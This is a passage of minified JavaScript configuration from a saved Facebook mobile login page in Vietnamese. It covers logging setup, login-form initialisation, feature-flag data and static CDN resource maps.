                }, 5237], ["cr:1642797", ["BanzaiBase"], {__rc: ["BanzaiBase", "Aa0UHWfu8NrPr1pBNrgHhHs7FXRN2ioLh1StWXqOXrgnKuaBOud0HQMqG6GFYeR-0SnDIXEiNW4eLgjuKdgMQ-ZQr2c"]}, -1], ["cr:694370", ["requestIdleCallbackBlue"], {__rc: ["requestIdleCallbackBlue", "Aa0UHWfu8NrPr1pBNrgHhHs7FXRN2ioLh1StWXqOXrgnKuaBOud0HQMqG6GFYeR-0SnDIXEiNW4eLgjuKdgMQ-ZQr2c"]}, -1], ["cr:692209", ["cancelIdleCallbackBlue"], {__rc: ["cancelIdleCallbackBlue", "Aa0UHWfu8NrPr1pBNrgHhHs7FXRN2ioLh1StWXqOXrgnKuaBOud0HQMqG6GFYeR-0SnDIXEiNW4eLgjuKdgMQ-ZQr2c"]}, -1], ["MBanzaiConfig", [], {
                    MAX_SIZE: 10000,
                    MAX_WAIT: 30000,
                    MIN_WAIT: null,
                    RESTORE_WAIT: 30000,
                    blacklist: ["time_spent"],
                    disabled: false,
                    gks: {platform_oauth_client_events: true, visibility_tracking: true, boosted_pagelikes: true},
                    known_routes: ["unified_logging", "artillery_javascript_actions", "artillery_javascript_trace", "artillery_logger_data", "logger", "falco", "gk2_exposure", "js_error_logging", "loom_trace", "marauder", "perfx_custom_logger_endpoint", "qex", "require_cond_exposure_logging", "srt_job_view_heartbeats", "sri_logger_data"],
                    should_drop_unknown_routes: true,
                    should_log_unknown_routes: false
                }, 32]],
                elements: [["__elem_de5177dd_0_0_g8", "u_0_0_zH", 1], ["__elem_921b58ef_0_0_fx", "login_form", 2], ["__elem_e24cb174_0_0_pm", "m_login_password", 1], ["__elem_7216e2ae_0_2_vC", "u_0_1_WH", 1], ["__elem_e03291d5_0_1_Lz", "u_0_2_1R", 1], ["__elem_e03291d5_0_0_vN", "u_0_3_ck", 1], ["__elem_7216e2ae_0_0_/T", "u_0_4_Nc", 1], ["__elem_8a020238_0_0_H1", "forgot-password-link", 1], ["__elem_7216e2ae_0_1_uu", "signup_button_area", 1], ["__elem_e980dec4_0_0_tD", "signup-button", 1], ["__elem_49f6b607_0_0_3n", "root", 1], ["__elem_717bb1ae_0_0_f2", "u_0_5_k7", 3], ["__elem_ad2bcfb1_0_0_ai", "u_0_6_7p", 1], ["__elem_eed16c0a_0_0_Fj", "u_0_7_wm", 1], ["__elem_a588f507_0_0_Qd", "u_0_8_5+", 1], ["__elem_a588f507_0_1_//", "u_0_9_pW", 1], ["__elem_0cdc66ad_0_0_Fy", "u_0_b_QK", 1], ["__elem_0cdc66ad_0_1_5U", "u_0_c_RW", 1]],
                require: [["ForgetPasswordAutoSearch", "addListenerForgetPasswordAutoSearch", [], ["m_login_email", "m_login_auto_search_form_contactpoint_hidden_input", "m_login_auto_search_form_forgot_password_button"]], ["MLoginController", "initAccountRecoveryFunnelLogging", ["__elem_8a020238_0_0_H1"], [{__m: "__elem_8a020238_0_0_H1"}, "click_forget_password", "iaasYLivkFqc6D9uwQ7E6XkQ"]], ["BrowserPrefillLogging", "initContactpointFieldLogging", [], [{
                    contactpointFieldID: "m_login_email",
                    serverPrefill: ""
                }]], ["BrowserPrefillLogging", "initPasswordFieldLogging", [], [{passwordFieldID: "m_login_password"}]], ["PlatformDialogCBTSetter", "setCBTInFormAndLog", ["__elem_921b58ef_0_0_fx"], [{__m: "__elem_921b58ef_0_0_fx"}, "client_logged_out_init_impression"]], ["MLoginView", "disableOnSubmit", ["__elem_921b58ef_0_0_fx", "__elem_7216e2ae_0_0_/T"], [{__m: "__elem_921b58ef_0_0_fx"}, {__m: "__elem_7216e2ae_0_0_/T"}]], ["MLoginController", "initRegButton", ["__elem_7216e2ae_0_1_uu"], [{
                    root: {__m: "__elem_7216e2ae_0_1_uu"},
                    regURI: "/reg-no-deeplink/?cid=103",
                    useRegToLogin: true
                }]], ["MLoginController", "initLoginForm", ["__elem_de5177dd_0_0_g8"], [{
                    root: {__m: "__elem_de5177dd_0_0_g8"},
                    ajaxURI: "/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2F&lwv=100",
                    clearOnDelete: false,
                    listenKeyDown: false,
                    isTwoStepsLogin: false,
                    isActionLoggingEnabled: true,
                    isCredsManagerEnabled: false,
                    isCredsSavingEnabled: true,
                    isPasswordlessEnabled: false,
                    doNotShowUserHeader: false,
                    shouldWaitForPasswordSave: false,
                    onErrorRegURI: "/r.php",
                    shouldAutoLandOnStep2: false,
                    shouldPrefillJioHeaderForRegFromLogin: false,
                    shouldProcessUserConsentForTokenHeader: false,
                    shouldProcessUserConsentForHeader: false,
                    shouldShowSmartLockSelector: false,
                    shouldRunBotDetection: false,
                    clearPrefillMaskOnKeydown: false,
                    datrCookie: "iaasYLivkFqc6D9uwQ7E6XkQ",
                    pubKeyData: {
                        publicKey: "481a7fe7d3960049349b1c1b7f42fb5358ea061eb197e70c4ec85d2d4d31d10e",
                        keyId: 30
                    },
                    shouldUseEmailDomainTypeahead: false,
                    showDuoLikePasswordless: false,
                    showSingleStepDuoLikePasswordless: false,
                    trackingPreference: "install_from_passwordless_flow"
                }]], ["MPasswordPlainTextToggle", "init", ["__elem_e24cb174_0_0_pm", "__elem_7216e2ae_0_2_vC", "__elem_e03291d5_0_0_vN", "__elem_e03291d5_0_1_Lz"], [{__m: "__elem_e24cb174_0_0_pm"}, {__m: "__elem_7216e2ae_0_2_vC"}, {__m: "__elem_e03291d5_0_0_vN"}, {__m: "__elem_e03291d5_0_1_Lz"}]], ["ServiceWorkerLoginAndLogoutListener", "listen", [], ["login_button_block", "login", "/sw?s=push", null]], ["MTouchable"], ["MBlockingTouchable", "init", ["__elem_e980dec4_0_0_tD"], [{__m: "__elem_e980dec4_0_0_tD"}]], ["AccessibilityWebVirtualCursorClickLogger", "init", ["__elem_49f6b607_0_0_3n"], [[{__m: "__elem_49f6b607_0_0_3n"}]]], ["GHLSurvey", "survey", [], []], ["MScrollPositionSaver"], ["LoadingIndicator", "init", ["__elem_eed16c0a_0_0_Fj", "__elem_a588f507_0_0_Qd", "__elem_a588f507_0_1_//"], [{__m: "__elem_eed16c0a_0_0_Fj"}, {__m: "__elem_a588f507_0_0_Qd"}, {__m: "__elem_a588f507_0_1_//"}]], ["MPageError"], ["MSeoDirectoryLinks", "initLinks", ["__elem_717bb1ae_0_0_f2", "__elem_ad2bcfb1_0_0_ai"], [{
                    visible: false,
                    toggleButton: {__m: "__elem_717bb1ae_0_0_f2"},
                    linksContainer: {__m: "__elem_ad2bcfb1_0_0_ai"},
                    expandButton: {__m: "__elem_717bb1ae_0_0_f2"},
                    collapseButton: {__m: "__elem_717bb1ae_0_0_f2"}
                }]], ["MLogoutClearCache"], ["MLynx", "setupDelegation", [], []], ["MPageHeaderAccessibility"], ["MBlockingTouchable", "init", ["__elem_0cdc66ad_0_0_Fy"], [{__m: "__elem_0cdc66ad_0_0_Fy"}]], ["MBlockingTouchable", "init", ["__elem_0cdc66ad_0_1_5U"], [{__m: "__elem_0cdc66ad_0_1_5U"}]], ["MLoadingIndicator", "init", [], ["u_0_a_q4"]], ["LogHistoryListeners"], ["ScriptPath", "set", [], ["/wap/index.php", "4e6eefd9", {
                    imp_id: "0bwOdfeni6OMxO76d",
                    ef_page: null
                }]], ["MCommentViewportTracking", "singleton", [], [{
                    enabled: true,
                    debug_console: false,
                    debug_html: false,
                    idle_timeout: 5000,
                    min_duration_to_log: 100,
                    min_visible_size: 200
                }]], ["MLogging", "main", [], [{refid: 8}]], ["RemoteDevice", "init", [], [{
                    performHardwareDetection: false,
                    hashId: null,
                    vpd: false
                }]], ["Artillery"], ["MLinkHack"], ["MModalDialogInit"], ["MVerifyCache", "main", [], [{viewer: 0}]], ["EventProfiler"], ["MPageNavigationTracking", "init", [], []], ["FalcoLoggerTransports", "attach", [], []], ["ScriptPathLogger", "startLogging", [], []], ["MTimeSpentBitArrayLogger", "init", [], ["m", false]], ["MCoreDeferred"], ["KeyframesRenderer"], ["FBKeyframesLoggedSession"], ["KeyframesAssetDecoder"], ["FbtLogging"], ["IntlQtEventFalcoEvent"], ["BanzaiScuba_DEPRECATED"], ["MPageControllerImpl"], ["LogWebMemoryUsageFalcoEvent"], ["MPageFetcherImpl"], ["RequireDeferredReference", "unblock", [], [["KeyframesRenderer", "FBKeyframesLoggedSession", "KeyframesAssetDecoder", "FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "MPageControllerImpl", "LogWebMemoryUsageFalcoEvent", "VisualCompletionGating", "MPageFetcherImpl"]]]],
                pre_display_requires: [["AddressBar", "setupLoadListener", [], [], 4], ["MobileBigPipeStratcomProxy", "init", [], [], 4], ["Stratcom", "init", [], [], 4], ["MViewport", "init", [], [], 4], ["ViewportDimensions", "init", [], [], 4], ["MPageController", "init", [], [], 4], ["onSyncTTI", "run", [], [], 4], ["MLiteInit", "init", [], [], 4]]
            },
            hsrp: {
                hsdp: {
                    bxData: {
                        "76": {uri: "https://static.xx.fbcdn.net/rsrc.php/ys/r/qjN6ucK8utP.m4a"},
                        "875231": {uri: "https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico"},
                        "1475263": {uri: "https://static.xx.fbcdn.net/rsrc.php/y3/r/sC0Gm3teqye.kf"},
                        "1475264": {uri: "https://static.xx.fbcdn.net/rsrc.php/yL/r/X9fsi_Sde5p.kf"},
                        "1475265": {uri: "https://static.xx.fbcdn.net/rsrc.php/yn/r/CmZYan198mB.kf"}
                    },
                    clpData: {
                        "1744178": {r: 1, s: 1},
                        "1814852": {r: 1},
                        "1838142": {r: 1, s: 1},
                        "1942319": {r: 1, s: 1},
                        "1842512": {r: 1},
                        "1829319": {r: 1},
                        "1743690": {r: 1},
                        "1829320": {r: 1},
                        "1843988": {r: 1},
                        "1848815": {r: 10000, s: 1},
                        "1949898": {r: 1},
                        "1765264": {r: 1, s: 1}
                    },
                    gkxData: {
                        "176": {result: true, hash: "AT4NwIszPuVVxWDOPco"},
                        "676781": {result: false, hash: "AT4-DnA47xPbjtkw6Lw"},
                        "676837": {result: false, hash: "AT4N8wBZA8ctCdHwhOo"},
                        "712819": {result: false, hash: "AT79nTpb4gT-yu866RM"},
                        "1217157": {result: false, hash: "AT6B7YmllOsArnK6JW8"},
                        "1224637": {result: false, hash: "AT7JRluWxuwDm3XzjMs"},
                        "1554827": {result: false, hash: "AT7zueGLhGo0cT5xBkk"},
                        "1738486": {result: false, hash: "AT4cX37oQco6DwhU0YE"},
                        "1923684": {result: false, hash: "AT7mpVz8edoKjtOGkmk"},
                        "1952739": {result: true, hash: "AT4Zq7lXWSlD3PCkRJc"},
                        "113": {result: false, hash: "AT4UEBnCWWtisiAc2dY"},
                        "910664": {result: false, hash: "AT69YyFAmMObhORGo8M"},
                        "1511920": {result: true, hash: "AT6pY2ROWoYnl3_c3WI"},
                        "1059877": {result: false, hash: "AT53XV4TWT4lc3_ma74"},
                        "1167394": {result: false, hash: "AT7BpN-tlUPwbIIFC-4"},
                        "1070739": {result: false, hash: "AT5rKAR6NQAuoRaH5gQ"},
                        "676811": {result: false, hash: "AT4zC0IqvJCbKsUeO9U"},
                        "676812": {result: false, hash: "AT6FULe6g-qrrrQdvj8"},
                        "820050": {result: true, hash: "AT7bjlcFFlowDw-STXs"},
                        "985697": {result: false, hash: "AT6gOJD7fT0UjmgDSRA"},
                        "148": {result: false, hash: "AT5V6Me6WVwsRI3wrYw"},
                        "1994902": {result: false, hash: "AT7e2ODUd_zspuYFgjc"},
                        "726410": {result: true, hash: "AT7w-jbTa3ueodj3G_k"},
                        "862436": {result: false, hash: "AT7YsAcWL8-1WZrO0G0"},
                        "1099893": {result: false, hash: "AT5kly2LSZV_DKGR3Dk"},
                        "1856755": {result: false, hash: "AT6QfXhS73R2_Bof-jU"},
                        "1902233": {result: true, hash: "AT6KvlEVVynsnGSy6Ho"},
                        "1951072": {result: true, hash: "AT7aEvzO1O_H_j8HiaA"},
                        "801076": {result: false, hash: "AT4-6yyd_xc9CeBxXpQ"},
                        "676888": {result: false, hash: "AT5cnlbYW75YDqp7m38"},
                        "676890": {result: false, hash: "AT5vHYzu5sCGqe1qUHU"},
                        "1136485": {result: true, hash: "AT4IpbQZeUF26lRqdRc"},
                        "1955413": {result: true, hash: "AT5Tny0Wtlel6ZKHffU"}
                    },
                    qexData: {
                        "32": {r: false},
                        "97": {r: false},
                        "256": {
                            r: false,
                            l: "J{\"u\":\"mtouch_ar_audio_lid\",\"t\":\"fb_loggedout\",\"gks\":[],\"qe\":null}"
                        },
                        "257": {r: false},
                        "330": {r: false},
                        "374": {r: false},
                        "391": {r: false},
                        "1723547": {r: true},
                        "1837716": {
                            r: "",
                            l: "J{\"u\":\"mtouch_audio_ship_design\",\"t\":\"fb_loggedout\",\"gks\":[],\"qe\":null}"
                        },
                        "1904180": {
                            r: null,
                            l: "J{\"u\":\"mtouch_audio_ship_design\",\"t\":\"fb_loggedout\",\"gks\":[],\"qe\":null}"
                        },
                        "1943804": {
                            r: false,
                            l: "J{\"u\":\"mtouch_audio_ship_design\",\"t\":\"fb_loggedout\",\"gks\":[],\"qe\":null}"
                        },
                        "1999210": {
                            r: null,
                            l: "J{\"u\":\"mtouch_audio_ship_design\",\"t\":\"fb_loggedout\",\"gks\":[],\"qe\":null}"
                        },
                        "1999211": {
                            r: null,
                            l: "J{\"u\":\"mtouch_audio_ship_design\",\"t\":\"fb_loggedout\",\"gks\":[],\"qe\":null}"
                        },
                        "154": {
                            r: false,
                            l: "J{\"u\":\"bizweb_push_notification\",\"t\":\"fb_acting_account\",\"gks\":[],\"qe\":\"453671222560117\"}"
                        },
                        "1786756": {r: null},
                        "833102": {r: null},
                        "1907780": {r: null},
                        "1907781": {r: null}
                    }
                }, hblp: {
                    sr_revision: 1003848272, consistency: {rev: 1003848272}, rsrcMap: {
                        CnrHNsN: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/y0/r/kDJGA6AlUau.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        s3cC9PY: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/jbOKt0eOoTI.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Mwuc/jX": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/OCpBRskq1jb.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "2cACfEv": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/umOm8coDHbQ.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "zy1CX+m": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3i6X14/y0/l/vi_VN/xAssJmwgXMA.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "KQ+loWk": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/BwjU4B_qfpp.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        hHxG4He: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yw/r/yu1W42PqNcd.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "4pHGMdE": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/-m5p15RVgSZ.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "2fmZT0K": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yf/r/HptE_o6N-2D.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        B9Pg81X: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/dTK0J_PY8HS.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        VvVFw8n: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/weqjNiXubEB.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        uoDWKMJ: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yf/r/OsLnD4h3sh4.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "0R1DUbH": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/DNN4rtnoBR0.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        rTZjQTw: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/EuaomQia8gX.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        yZ5FJz9: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yL/r/klNKCZs-Yr3.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        oOc1YGT: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/fPXpu-OJ_YF.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "lbypP0/": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/rHRKkreHAnf.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "jUlbV/0": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yw/r/yrkxgcJiJxp.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        B2zkyE5: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/S0-BtYXaRJF.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        KP8RczC: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/vyPDqJVAvGb.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        MiOoZOi: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/PYQXNxSTzVA.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "b1HXUh/": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3i5le4/yD/l/vi_VN/cilZQb0iply.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        wtKmqZ2: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yH/r/YMt42CzC3B2.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "/57qFCN": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yt/r/ahw3tGh_BXM.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        pEQTtub: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3iUIV4/yf/l/vi_VN/hZrshuOuDOV.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        XNTi6AE: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3iC9q4/yQ/l/vi_VN/iSHQ4Krw-S8.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "i/49c5Q": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3i8594/yN/l/vi_VN/n4bGLjGRWrl.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        knQcys9: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3iwrE4/yn/l/vi_VN/woSiLHt_DZP.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "9qXXxgn": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/2UpQOc_ShIW.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "165V4XB": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/og9N2BkGqKK.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "E+l6vVA": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/1cm9-wGVqk5.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "V/UX1Wg": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/y-/r/1t5GejlY-Fo.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "1yqwozP": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yK/r/wWCsqErxByh.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "M+waYRw": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/13lUgglkwxN.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        WMm0L8D: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yP/r/YzW-5rpbEND.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        ENAoSkg: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/Ld-Nw2Iz_lL.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        PWGCI6V: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yo/r/_44K-vz-0vo.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        lE0C0Q8: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yo/r/c1fD_RlKUo0.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        Nm4S7Tg: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/XYnCPPuJL3_.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        E9ERssr: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/viHWjbul8fA.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        l4PzlRm: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/s44UCekrM4c.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "3UpiF8K": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yH/r/5tJCqbK41Gs.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "88Pbcfe": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/y3/r/OMPjVMM0yPB.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        eoynDpL: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/ACHhMZfSpbW.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        CZBm4kX: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/YTqwFMImsCj.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        r4Fh30Y: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/EOoHuLJ2KPA.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "cumX1+0": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/y-/r/78-1k23KuSd.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        TUxV68S: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/cUz2MN22F_X.js?_nc_x=Ij3Wp8lg5Kz"
                        }
                    }, compMap: {
                        KeyframesRenderer: {r: ["CnrHNsN", "BGVORZa", "s3cC9PY"], be: 1},
                        FBKeyframesLoggedSession: {
                            r: ["s3cC9PY", "Mwuc/jX", "2cACfEv", "zy1CX+m", "BGVORZa", "CnrHNsN", "KQ+loWk", "hHxG4He", "4pHGMdE", "2fmZT0K"],
                            rds: {m: ["BanzaiScuba_DEPRECATED", "FbtLogging", "IntlQtEventFalcoEvent"], r: ["B9Pg81X"]},
                            be: 1
                        },
                        KeyframesAssetDecoder: {r: ["CnrHNsN", "KQ+loWk", "BGVORZa"], be: 1},
                        QPLInspector: {r: ["VvVFw8n"], be: 1},
                        ODS: {r: ["s3cC9PY", "2fmZT0K"], be: 1},
                        TransportSelectingClientSingleton: {
                            r: ["uoDWKMJ", "0R1DUbH", "rTZjQTw", "s3cC9PY", "4pHGMdE", "yZ5FJz9", "2fmZT0K", "oOc1YGT", "lbypP0/"],
                            rds: {
                                m: ["ContextualConfig", "BladeRunnerClient", "BanzaiScuba_DEPRECATED", "DGWRequestStreamClient", "MqttLongPollingRunner", "FbtLogging", "IntlQtEventFalcoEvent"],
                                r: ["jUlbV/0", "BGVORZa", "hHxG4He", "B2zkyE5", "KP8RczC", "B9Pg81X", "MiOoZOi", "b1HXUh/"]
                            },
                            be: 1
                        },
                        RequestStreamCommonRequestStreamCommonTypes: {r: ["oOc1YGT"], be: 1},
                        Cookie: {
                            r: ["s3cC9PY"],
                            rds: {
                                m: ["BanzaiScuba_DEPRECATED", "FbtLogging", "IntlQtEventFalcoEvent"],
                                r: ["2fmZT0K", "B9Pg81X", "BGVORZa", "hHxG4He", "4pHGMdE"]
                            },
                            be: 1
                        },
                        KeyframesPluginRandomSubdocument: {
                            r: ["9qXXxgn", "165V4XB", "hHxG4He", "E+l6vVA", "V/UX1Wg"],
                            be: 1
                        },
                        KeyframesPluginRandomSubdocumentSchema: {r: ["1yqwozP"], be: 1},
                        KeyframesPluginSoundSchema: {r: ["CnrHNsN", "M+waYRw"], be: 1},
                        KeyframesPluginSound: {r: ["CnrHNsN", "9qXXxgn", "165V4XB", "WMm0L8D"], be: 1},
                        KeyframesPluginTrimPathSchema: {r: ["CnrHNsN", "ENAoSkg"], be: 1},
                        KeyframesPluginTrimPath: {
                            r: ["CnrHNsN", "9qXXxgn", "165V4XB", "s3cC9PY", "PWGCI6V", "lE0C0Q8", "Nm4S7Tg"],
                            be: 1
                        },
                        KeyframesPluginLayerNameSchema: {r: ["E9ERssr"], be: 1},
                        KeyframesPluginLayerName: {r: ["9qXXxgn", "165V4XB", "l4PzlRm"], be: 1},
                        KeyframesPluginDynamicProperties: {r: ["9qXXxgn", "165V4XB", "3UpiF8K"], be: 1},
                        KeyframesPluginDynamicPropertiesSchema: {r: ["88Pbcfe"], be: 1},
                        KeyframesPluginLayerTags: {r: ["9qXXxgn", "165V4XB", "eoynDpL"], be: 1},
                        KeyframesPluginLayerTagsSchema: {r: ["CZBm4kX"], be: 1},
                        KeyframesPluginSubdocumentSwap: {r: ["9qXXxgn", "165V4XB", "r4Fh30Y"], be: 1},
                        KeyframesPluginSubdocumentSwapSchema: {r: ["cumX1+0"], be: 1},
                        WebSpeedInteractionsTypedLogger: {
                            r: ["s3cC9PY", "2fmZT0K", "hHxG4He", "TUxV68S", "4pHGMdE"],
                            rds: {
                                m: ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED"],
                                r: ["BGVORZa", "B9Pg81X"]
                            },
                            be: 1
                        },
                        PerfXSharedFields: {r: ["hHxG4He", "s3cC9PY", "BGVORZa"], be: 1}
                    }
                }
            },
            allResources: ["nSxUM1r", "kmcUxH7", "s3cC9PY", "Mwuc/jX", "wtKmqZ2", "hHxG4He", "4pHGMdE", "2fmZT0K", "zy1CX+m", "/57qFCN", "pEQTtub", "BGVORZa", "CnrHNsN", "0R1DUbH", "8tsrDhw", "2cACfEv", "XNTi6AE", "B9Pg81X", "i/49c5Q", "knQcys9", "KQ+loWk"]
        });
    }));</script>
<script>requireLazy(["__bigPipe"], function (bigPipe) {
        bigPipe.setPageID("6966125832479156457-0")
    });
    CavalryLogger.setPageID("6966125832479156457-0");</script>
<script nonce="">(function () {
        var n = now_inl();
        requireLazy(["__bigPipe"], function (bigPipe) {
            bigPipe.beforePageletArrive("last_response", n);
        })
    })();</script>
<script nonce="">requireLazy(["__bigPipe"], (function (bigPipe) {
        bigPipe.onPageletArrive({
            id: "last_response",
            phase: 63,
            last_in_phase: true,
            the_end: true,
            jsmods: {
                define: [["IntlCurrentLocale", [], {code: "vi_VN"}, 5954], ["QuickLogConfig", [], {
                    qpl_events: {
                        "212543": {sampleRate: 250, samplingMethod: 1},
                        "393276": {sampleRate: 50, samplingMethod: 1},
                        "396252": {sampleRate: 50, samplingMethod: 1},
                        "397979": {sampleRate: 50, samplingMethod: 1},
                        "655575": {sampleRate: 1, samplingMethod: 1},
                        "655576": {sampleRate: 5000, samplingMethod: 1},
                        "655584": {sampleRate: 1, samplingMethod: 1},
                        "655653": {sampleRate: 250, samplingMethod: 1},
                        "663703": {sampleRate: 1, samplingMethod: 1},
                        "917556": {sampleRate: 100, samplingMethod: 1},
                        "917557": {sampleRate: 1000, samplingMethod: 1},
                        "918598": {sampleRate: 100, samplingMethod: 1},
                        "920349": {sampleRate: 100, samplingMethod: 1},
                        "920899": {sampleRate: 100, samplingMethod: 1},
                        "921754": {sampleRate: 100, samplingMethod: 1},
                        "922804": {sampleRate: 100, samplingMethod: 1},
                        "923401": {sampleRate: 100, samplingMethod: 1},
                        "924733": {sampleRate: 100, samplingMethod: 1},
                        "932588": {sampleRate: 100, samplingMethod: 1},
                        "2101001": {sampleRate: 250, samplingMethod: 1},
                        "2102327": {sampleRate: 50, samplingMethod: 1},
                        "2103143": {sampleRate: 250, samplingMethod: 1},
                        "2107124": {sampleRate: 1, samplingMethod: 1},
                        "2108977": {sampleRate: 10, samplingMethod: 1},
                        "2109054": {sampleRate: 250, samplingMethod: 1},
                        "3473463": {sampleRate: 10000, samplingMethod: 1},
                        "3473464": {sampleRate: 10000, samplingMethod: 1},
                        "3473465": {sampleRate: 10, samplingMethod: 1},
                        "3735589": {sampleRate: 100, samplingMethod: 1},
                        "3735590": {sampleRate: 1000, samplingMethod: 1},
                        "3735591": {sampleRate: 100, samplingMethod: 1},
                        "3735592": {sampleRate: 1000, samplingMethod: 1},
                        "3735593": {sampleRate: 1000, samplingMethod: 1},
                        "3735594": {sampleRate: 1000, samplingMethod: 1},
                        "3735595": {sampleRate: 100, samplingMethod: 1},
                        "3735596": {sampleRate: 1000, samplingMethod: 1},
                        "3735597": {sampleRate: 1000, samplingMethod: 1},
